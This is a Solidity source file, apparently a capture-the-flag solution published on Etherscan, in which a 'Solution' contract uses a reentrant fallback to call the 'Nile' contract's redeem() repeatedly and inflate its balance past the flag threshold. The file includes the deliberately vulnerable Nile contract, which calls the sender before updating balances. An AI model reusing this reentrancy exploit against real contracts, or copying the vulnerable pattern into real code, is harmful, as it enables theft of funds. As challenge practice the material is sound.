/**
 *Submitted for verification at Etherscan.io on 2022-11-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract Solution {
    event Rounds(uint8, uint8);

    uint8 rounds;
    Nile public nile;

    constructor(address _nileAddress) {
        nile = Nile(_nileAddress);
    }

    fallback() external {
        emit Rounds(1, rounds);
        if (rounds > 0) {
            rounds -= 1;
            nile.redeem(99);
        }
    }

    function solve(bytes32 token) external {
        nile.createAccount();
        rounds = 11;
        emit Rounds(0, rounds);
        nile.redeem(99);
        nile.getFlag(token);
    }
}

contract Nile {
    mapping(address => uint256) balance;
    mapping(address => uint256) redeemable;
    mapping(address => bool) accounts;

    event RedeemDetails(bool, uint256);
    event Balance(uint256, bytes32, address);

    event GetFlag(bytes32);
    event Redeem(address, uint256);
    event Created(address, uint256);
    
    function redeem(uint amount) public {
        require(accounts[msg.sender]);
        require(redeemable[msg.sender] > amount);

        (bool status, ) = msg.sender.call("");
        emit RedeemDetails(status, amount);


        if (!status) {
            revert();
        }

        redeemable[msg.sender] -= amount;

        balance[msg.sender] += amount;

        emit Redeem(msg.sender, amount);
    }

    function createAccount() public {
        balance[msg.sender] = 0;
        redeemable[msg.sender] = 100;
        accounts[msg.sender] = true;

        emit Created(msg.sender, 100);
    }

    function getFlag(bytes32 token) public {
        emit Balance(balance[msg.sender], token, msg.sender);
        //require(accounts[msg.sender]);
        //require(balance[msg.sender] > 1000);

        //emit GetFlag(token);
    }
}

// contract Nile {
//     mapping(address => uint256) balance;
//     mapping(address => uint256) redeemable;
//     mapping(address => bool) accounts;

//     event GetFlag(bytes32);
//     event Redeem(address, uint256);
//     event Created(address, uint256);
    
//     function redeem(uint amount) public {
//         require(accounts[msg.sender]);
//         require(redeemable[msg.sender] > amount);

//         (bool status, ) = msg.sender.call("");

//         if (!status) {
//             revert();
//         }

//         redeemable[msg.sender] -= amount;

//         balance[msg.sender] += amount;

//         emit Redeem(msg.sender, amount);
//     }

//     function createAccount() public {
//         balance[msg.sender] = 0;
//         redeemable[msg.sender] = 100;
//         accounts[msg.sender] = true;

//         emit Created(msg.sender, 100);
//     }

//     function createEmptyAccount() public {
//         // empty account starts with 0 balance
//         balance[msg.sender] = 0;
//         accounts[msg.sender] = true;
//     }

//     function deleteAccount() public {
//         require(accounts[msg.sender]);
//         balance[msg.sender] = 0;
//         redeemable[msg.sender] = 0;
//         accounts[msg.sender] = false;
//     }

//     function getFlag(bytes32 token) public {
//         require(accounts[msg.sender]);
//         require(balance[msg.sender] > 1000);

//         emit GetFlag(token);
//     }
// }